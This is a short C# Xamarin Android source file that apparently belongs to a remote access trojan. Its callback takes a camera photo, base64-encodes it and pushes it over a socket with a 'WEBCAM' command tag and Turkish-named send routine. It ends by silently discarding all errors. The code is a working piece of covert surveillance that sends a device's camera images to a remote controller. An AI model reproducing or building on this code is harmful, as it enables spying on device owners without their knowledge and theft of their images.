using Android.Hardware;
using System;
using System.Net.Sockets;

namespace Task2
{
    class PictureCallback : Java.Lang.Object, Camera.IPictureCallback
    {
        private int _cameraID;
        public Socket socket;
        public PictureCallback(int cameraID, Socket sck)
        {
            socket = sck;
            _cameraID = cameraID;
        }

        public void OnPictureTaken(byte[] data, Camera camera)
        {
            try
            {
                ((MainActivity)MainActivity.global_activity).soketimizeGonder("WEBCAM", "[VERI]" + Convert.ToBase64String(data) + "[VERI][0x09]");
            }
            catch (Exception)
            {
            }
            try
            {

                camera.StopPreview();
                camera.Release();
            }
            catch (Exception) { }

        }
    }
}